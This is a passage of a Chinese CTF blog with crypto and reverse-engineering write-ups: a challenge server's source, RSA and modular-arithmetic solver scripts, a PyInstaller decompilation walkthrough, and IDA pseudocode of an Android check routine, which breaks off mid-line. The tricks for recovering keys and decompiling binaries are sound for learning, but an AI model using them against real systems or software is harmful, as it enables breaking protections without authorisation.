<h2 id="Crypto-ezl1near（unsolved）"><a href="#Crypto-ezl1near（unsolved）" class="headerlink" title="Crypto-ezl1near（unsolved）"></a>Crypto-ezl1near（unsolved）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes , bytes_to_long , getPrime , inverse</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> socketserver , signal</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">q = <span class="number">2</span>**<span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getrandbits</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> bytes_to_long(os.urandom(n // <span class="number">8</span>+<span class="number">1</span>)) &gt;&gt; (<span class="number">8</span>-n%<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">server</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recv</span>(<span class="params">self</span>):</span></span><br><span class="line">        data = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(msg , <span class="built_in">bytes</span>):</span><br><span class="line">            msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            msg = msg.encode()</span><br><span class="line">        self.request.sendall(msg)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">        _hexdigest = sha256(proof.encode()).hexdigest()</span><br><span class="line">        self._send(<span class="string">f&quot;sha256(XXXX+<span class="subst">&#123;proof[<span class="number">4</span>:]&#125;</span>) == <span class="subst">&#123;_hexdigest&#125;</span>&quot;</span>.encode())</span><br><span class="line">        self._send(<span class="string">b&#x27;Give me XXXX: &#x27;</span>)</span><br><span class="line">        x = self._recv()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:].encode()).hexdigest() != _hexdigest:</span><br><span class="line">            self.send(<span class="string">&#x27;wrong&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">genrsa</span>(<span class="params">self</span>):</span></span><br><span class="line">        _p = getPrime(<span class="number">1024</span>)</span><br><span class="line">        _q = getPrime(<span class="number">1024</span>)</span><br><span class="line">        self.n = _p * _q</span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.d = inverse(self.e , (_p-<span class="number">1</span>)*(_q-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_vec</span>(<span class="params">self,num , length</span>):</span></span><br><span class="line">        vec = []</span><br><span class="line">        <span class="keyword">while</span> length &gt; <span class="number">0</span>:</span><br><span class="line">            vec = [num % q] + vec</span><br><span class="line">            num //= q</span><br><span class="line">            length -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> vec</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_mat</span>(<span class="params">self,numlist</span>):</span></span><br><span class="line">        M =[]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> numlist:</span><br><span class="line">            M.append(self.to_vec(i , <span class="number">40</span>))</span><br><span class="line">        <span class="keyword">return</span> M</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">self, key , m</span>):</span></span><br><span class="line">        key = self.to_mat(key)</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">            temp = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">                temp += m[j]* key[j][i]</span><br><span class="line">                temp %= q</span><br><span class="line">            res.append(temp)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">120</span>)</span><br><span class="line">        self.proof_of_work()</span><br><span class="line">        self.genrsa()</span><br><span class="line">        self._send(<span class="built_in">str</span>(self.n))</span><br><span class="line">        self._send(<span class="built_in">str</span>(self.e))</span><br><span class="line">        secret = [<span class="number">1</span>] + [<span class="number">2</span>*getrandbits(<span class="number">23</span>)-<span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>)]</span><br><span class="line">        self._send(<span class="string">b&#x27;Please generate key for me and I will give you my secret.But you have only two chances.&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            key = []</span><br><span class="line">            f0 = getrandbits(<span class="number">480</span>)</span><br><span class="line">            key.append(f0)</span><br><span class="line">            self._send(<span class="built_in">str</span>(<span class="built_in">pow</span>(f0 , self.e , self.n)))</span><br><span class="line">            f0 += f0 &lt;&lt; <span class="number">480</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">                self._send(<span class="string">&#x27;key&#x27;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>) + <span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">                c = <span class="built_in">int</span>(self._recv())</span><br><span class="line">                m = <span class="built_in">pow</span>(c , self.d , self.n)</span><br><span class="line">                f = m - f0</span><br><span class="line">                f %= self.n</span><br><span class="line">                key.append(f)</span><br><span class="line">            c = self.enc(key , secret)</span><br><span class="line">            self._send(<span class="string">&#x27;Thanks, here is your cipher:&#x27;</span> + <span class="built_in">str</span>(c))</span><br><span class="line">        self._send(<span class="string">b&#x27;do you know the secret?&#x27;</span>)</span><br><span class="line">        guess = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> self._recv().split(<span class="string">b&#x27; &#x27;</span>)]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(guess) == <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">                <span class="keyword">if</span> guess[j] != secret[j]:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">            </span><br><span class="line">                self._send(<span class="string">b&#x27;congratulations. here is your flag:&#x27;</span>)</span><br><span class="line">                self._send(flag)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self._send(<span class="string">b&#x27;L1near don\&#x27;t care.&#x27;</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ForkingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10000</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), server)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<p>没心情，看不下去了</p>
<p>可谓是重大失误，全程密码爆0，签到题搞心态，对不起web和misc的师傅</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210830 8月DASCrypto方向WP</title>
    <url>/posts/67d634b2/</url>
    <content><![CDATA[<p>怕没时间复现？在比赛中复现吧！ko no DAS8月赛 da</p>
<span id="more"></span>

<h1 id="DAS"><a href="#DAS" class="headerlink" title="DAS"></a>DAS</h1><h2 id="Crypto-easymath"><a href="#Crypto-easymath" class="headerlink" title="Crypto-easymath"></a>Crypto-easymath</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()) &lt; <span class="number">50</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">str</span>(<span class="built_in">int</span>.from_bytes(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read(), byteorder=<span class="string">&#x27;big&#x27;</span>) &lt;&lt; <span class="number">10000</span>).endswith(</span><br><span class="line">    <span class="string">&#x27;1862790884563160582365888530869690397667546628710795031544304378154769559410473276482265448754388655981091313419549689169381115573539422545933044902527020209259938095466283008&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>代码很短，也可以直接搜到原题</p>
<p><code>bytesorder=&#39;big&#39;</code>可以理解是正常的顺序</p>
<p>主要是觉得很神奇，左移10000位，然后只告诉了低579位，真的可以还原吗？</p>
<p>不过用数学语言来表达就习惯多了<br>$$<br>c=flag\times 2^{10000}\ mod\ 10^{175}<br>$$<br>相当于取了个余；只要求出$2^{10000}$在模$10^{175}$下的逆元就行，这不是有手就行，但显然这个逆元并不存在，但问题不大，稍微变一下<br>$$<br>c=flag\times 2^{10000}\ mod\ 5^{175}<br>$$</p>
<hr>
<p>因为有性质，如果$a\equiv b\ (mod\ n),\ a\equiv b\ (mod\ m),\ (m, n)=1$，则$a\equiv b(mod\ mn)$</p>
<hr>
<p>感觉反着来也成立的吧，显然$(2^{175},\ 5^{175})=1$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">5</span> ** <span class="number">175</span></span><br><span class="line">c = <span class="number">1862790884563160582365888530869690397667546628710795031544304378154769559410473276482265448754388655981091313419549689169381115573539422545933044902527020209259938095466283008</span></span><br><span class="line">c = c</span><br><span class="line">phi = <span class="number">5</span> ** <span class="number">174</span></span><br><span class="line">e = <span class="number">2</span> ** <span class="number">10000</span></span><br><span class="line">d = invert(e, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c * d % n))</span><br></pre></td></tr></table></figure>

<p>主要还是这条性质吧，其他的一些解法像是更底层一点的</p>
<h2 id="Crypto-ezRSA"><a href="#Crypto-ezRSA" class="headerlink" title="Crypto-ezRSA"></a>Crypto-ezRSA</h2><p>这个ez诚不欺我</p>
<p>直接转化成等于的形式，然后取个gcd，因为取出来可能不是正好是n和p，所以用分解攻击factordb剔除小因子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">plain1 = <span class="number">3796374001</span></span><br><span class="line">cipher1 = <span class="number">10814407739419442187905858785036186878265127046318055454993453460552141704269761831133605965488334657725928223663072928135729092442048892277444747664105855191494328013597494843840801624660190005877515193495251116322331333145225214492628388272052283297261629247983765384231471683884012700575979269960065526415802023634510913009036934242220680865773837250316443624988133196570064551438174112950794689256211630478109685814880608384948776450292755634359375937804770120858228075005653177911703351120582838064680054557165091424216996781206537691443956931890710761301856045586473958014856501026856223946554632634123695548179</span></span><br><span class="line">plain2 = <span class="number">4274439796</span></span><br><span class="line">cipher2 = <span class="number">87226798597265930735797832586236279967789468186786741246367414679613517601654025942029826295922574046522178393263827646913102970456195019295401416652274787934598801006209685121040719655143935749480878915637540137699100422932935519357118466505812144970497483991623024823375063776302868706571808198638413485212863316779488625319157322436072639726910982871292474427111853478193221459564153774349503133897947087219144794655871631028877397232372688447849203202066982834256420368807780090246093374914035033275326840206150648030439511140807548259558987343365751983159445433804444373606478977126329710773866415852267322001</span></span><br><span class="line">plain3 = <span class="number">3325291543</span></span><br><span class="line">cipher3 = <span class="number">9382727308462526071828291861625444755821341794212101844314359460079432045375739882063652976611283182057033881092525502333782051326520856709162727825183042333495142759484340360567209663928461296371430651153068234201274220444046746723715852931539307137462642852266744794350148429783596186264775135674497726336356558991142315096962405777053398974439740872315007701981484005150026915096332916499718849929261683668753849212760142928383699802276667736418472263282318556853006287601969938973761042341846844526359073801116843895009315716346895596793683181704835335051683309743931741006154082213663428178283831538866255884755</span></span><br><span class="line">plain4 = <span class="number">1344652736</span></span><br><span class="line">cipher4 = <span class="number">4321964026676773781748104809247153356237715067039867231031624087256207483823813596319043458347848480918702592529113491431289681396399509022324524505867856178311958890363168588728856811216344821674576551978795805425938895529979965804450330107190184989162075120112336133813443406172261019202954524704870212620162773467949822492505161759519710435619043135693162949516270801813957833639117255071409629966835262468558867355399456489652824578176999147239152024128878816180401772196756218195440508847291475372211289300191672193680292568402473128269561454972660235893426215596184157205084579301349999511988743927089317168711</span></span><br><span class="line">c = <span class="number">7676870019429280974392994820719779231294040954319033563743135447473572416831050516949578774541281865709413894823796173396916557712257817949278444474172193939467995392598453462557057904995693840979847693206445078435907817047607948884368740596897139479299803522434307154541548742050088306413312454547460881877229439237898277933224023743845054110141568593673519203476919586868299617487091772845879027851695029674390129630380608842037317291970843742534837090616445063709778227810263198355145168049129671663511533431798983910771539362325095830241252453404715144468588527605118717772056998732396545216696090692231228929195</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = gcd(plain1**e-cipher1, plain3**e-cipher3) // <span class="number">2</span></span><br><span class="line">p = gcd(plain2**e-cipher2, plain4**e-cipher4) // <span class="number">65</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n)))</span><br></pre></td></tr></table></figure>

<p>放sage里跑好了</p>
<h2 id="Crypto-let’s-play-with-rsa"><a href="#Crypto-let’s-play-with-rsa" class="headerlink" title="Crypto-let’s play with rsa~"></a>Crypto-let’s play with rsa~</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime,nextprime</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime <span class="keyword">as</span> getprime ,long_to_bytes,bytes_to_long,inverse</span><br><span class="line">flag=<span class="string">&#x27;flag&#123;***************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">play</span>():</span></span><br><span class="line">    p=getprime(<span class="number">1024</span>)</span><br><span class="line">    q=getprime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    n=p*q</span><br><span class="line">    e=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Hello,let&#x27;s play rsa~\n&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Now,I make some numbers,wait a second\n&#x27;</span></span><br><span class="line">    n1=getprime(<span class="number">200</span>)</span><br><span class="line">    n2=getprime(<span class="number">200</span>)</span><br><span class="line">    number=n1*n2</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Ok,i will send two numbers to you,one of them was encoded.\n&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Encode n1:%d,\n&quot;</span>%(<span class="built_in">pow</span>(n1,e,n))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;And n2:%d.\n&quot;</span>%n2</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Information that can now be made public:the public key (n,e):(%d,%d)\n&quot;</span>%(n,e)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            c=<span class="built_in">int</span>(raw_input(<span class="string">&quot;ok,now,tell me the value of the number (encode it for safe):&quot;</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Sorry,the input is illeagal, and the integer is accept~&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    d=inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">    <span class="keyword">if</span> m==number:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;It&#x27;s easy and interesting,didn&#x27;t it?\n&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;This is the gift for you :&quot;</span>+flag</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Emmmmm,there is something wrong, bye~\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    play()</span><br></pre></td></tr></table></figure>

<p>简单性质的应用，想让我们给出$c=(n_1\times n_2)^e\ mod\ n$，提供了n和e，以及$c_1=n_1^e\ mod\ n$和$n_2$，这还不简单<br>$$<br>c=(n_1^e\ mod\ n\cdot n_2^e\ mod\ n)\ mod\ n=(c_1\cdot n_2^e\ mod\ n)\ mod\ n<br>$$<br>直接手撕，才三血</p>
<h2 id="Re-py"><a href="#Re-py" class="headerlink" title="Re-py"></a>Re-py</h2><p>看出的人比较多，想肯定有原题，然后就搜到了这位师傅的<a href="https://blog.csdn.net/z_Fuck/article/details/109479960">博客</a>，一些python的反编译操作，学到了；不太懂原理，我这里简单列下步奏</p>
<p>首先用PE工具看下</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210830152655257.png" alt="image-20210830152655257"></p>
<p>不知道哪里不对，但是用PEiD看，会告诉你是一个无效的exe文件</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210830152749825.png" alt="image-20210830152749825"></p>
<p>说是用python打包的exe文件，反编译一下，使用github的<code>pyinstxtractor.py</code>工具</p>
<p><code>python pyinstxtractor.py py.exe</code></p>
<p>会得到一个文件夹，需要关注没有后缀名的<code>py</code>和<code>struct</code>，用查看内码的软件打开，将<code>struct</code>文件开头和<code>py</code>不一样的代码给拷贝到<code>py</code>处，保存成<code>.pyc</code>文件</p>
<p>然后用<code>uncompyle6</code>反编译的成源文件，直接用<code>pip install uncompyle</code>即可安装</p>
<p><code>uncompyle6 py.pyc py.py</code></p>
<p>得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        res = <span class="built_in">ord</span>(s[i]) ^ <span class="number">32</span></span><br><span class="line">        res += <span class="number">31</span></span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = <span class="string">&#x27;ek`fz13b3c5e047b`bd`0/c268e600e7c5d1`|&#x27;</span></span><br><span class="line">strings = <span class="string">&#x27;&#x27;</span></span><br><span class="line">strings = <span class="built_in">input</span>(<span class="string">&#x27;Input:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> encode(strings) == m:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Correct!&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Try again!&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后逆回去就好了</p>
<h2 id="Re-apkrev"><a href="#Re-apkrev" class="headerlink" title="Re-apkrev"></a>Re-apkrev</h2><p><em>逆向都是2020华为武汉研究所网络安全峰会CTF的题目，但是网上只能搜到一位师傅写的WP，偏偏这道题他没有更，看来要多搜集点逆向师傅的博客</em></p>
<p>第一次真正意义上逆向，之前都是闹着玩，现在看着ida的伪代码慢慢琢磨了</p>
<p>显示基操，用模拟器打开，发现要输入一个注册码，然后安卓逆向工具去分析，找到MainActivity中的onClick，发现关键的函数<code>myCheck</code>被隐藏了，搜了下，藏在<code>.so</code>文件里了，所以将<code>.apk</code>改成<code>.zip</code>然后解压找到</p>
<p>说是类似RC4的流密码，但看伪代码好吃力啊</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">Java_com_example_re_MainActivity_myCheck</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// x20</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// x0</span></span><br><span class="line">  __int64 v5; <span class="comment">// x19</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// x21</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// x22</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// w21</span></span><br><span class="line">  <span class="keyword">void</span> *v9; <span class="comment">// x19</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v10; <span class="comment">// x20</span></span><br><span class="line">  <span class="keyword">size_t</span> v11; <span class="comment">// w0</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// w20</span></span><br><span class="line">  _DWORD *v13; <span class="comment">// x0</span></span><br><span class="line">  <span class="keyword">int32x4_t</span> v14; <span class="comment">// q0</span></span><br><span class="line">  __int64 v15; <span class="comment">// x8</span></span><br><span class="line">  <span class="keyword">int32x4_t</span> v16; <span class="comment">// q1</span></span><br><span class="line">  <span class="keyword">int32x4_t</span> v17; <span class="comment">// q2</span></span><br><span class="line">  <span class="keyword">char</span> *v18; <span class="comment">// x9</span></span><br><span class="line">  <span class="keyword">int32x4_t</span> v19; <span class="comment">// q3</span></span><br><span class="line">  __int64 v20; <span class="comment">// x8</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v21; <span class="comment">// w11</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// w9</span></span><br><span class="line">  <span class="keyword">char</span> *v23; <span class="comment">// x10</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// w13</span></span><br><span class="line">  <span class="keyword">char</span> *v25; <span class="comment">// x14</span></span><br><span class="line">  __int64 v26; <span class="comment">// x9</span></span><br><span class="line">  __int64 v27; <span class="comment">// x10</span></span><br><span class="line">  __int64 v28; <span class="comment">// x8</span></span><br><span class="line">  <span class="keyword">char</span> *v29; <span class="comment">// x12</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// w14</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// w16</span></span><br><span class="line">  __int64 v32; <span class="comment">// x9</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v34; <span class="comment">// [xsp+8h] [xbp-268h] BYREF</span></span><br><span class="line">  __int64 v35; <span class="comment">// [xsp+10h] [xbp-260h]</span></span><br><span class="line">  <span class="keyword">char</span> *v36; <span class="comment">// [xsp+18h] [xbp-258h]</span></span><br><span class="line">  __int128 dest[<span class="number">33</span>]; <span class="comment">// [xsp+20h] [xbp-250h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>));</span><br><span class="line">  v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + <span class="number">1352LL</span>))(a1, a3, <span class="number">0LL</span>);</span><br><span class="line">  v34 = <span class="number">0LL</span>;</span><br><span class="line">  v35 = <span class="number">0LL</span>;</span><br><span class="line">  v36 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(v3);</span><br><span class="line">  v5 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt;= <span class="number">0x17</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (v4 + <span class="number">16</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF0</span>LL;</span><br><span class="line">    v6 = (<span class="keyword">char</span> *)<span class="keyword">operator</span> <span class="keyword">new</span>(v7);</span><br><span class="line">    v35 = v5;</span><br><span class="line">    v36 = v6;</span><br><span class="line">    v34 = v7 | <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = (<span class="keyword">char</span> *)&amp;v34 + <span class="number">1</span>;</span><br><span class="line">  LOBYTE(v34) = <span class="number">2</span> * v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">LABEL_5:</span><br><span class="line">    <span class="built_in">memcpy</span>(v6, v3, v5);</span><br><span class="line">  v6[v5] = <span class="number">0</span>;</span><br><span class="line">  dest[<span class="number">30</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">31</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">28</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">29</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">26</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">27</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">24</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">25</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">22</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">23</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">20</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">21</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">18</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">19</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">16</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">17</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">14</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">15</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">12</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">13</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">10</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">11</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">8</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">9</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">7</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">5</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">6</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">3</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">4</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">1</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">2</span>] = <span class="number">0u</span>;</span><br><span class="line">  dest[<span class="number">0</span>] = <span class="number">0u</span>;</span><br><span class="line">  fflush(&amp;_sF);</span><br><span class="line">  v8 = v34;</span><br><span class="line">  v9 = v36;</span><br><span class="line">  <span class="keyword">if</span> ( (v34 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    v10 = v36;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v10 = (<span class="keyword">char</span> *)&amp;v34 + <span class="number">1</span>;</span><br><span class="line">  v11 = <span class="built_in">strlen</span>(v10);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, v10, v11);</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  <span 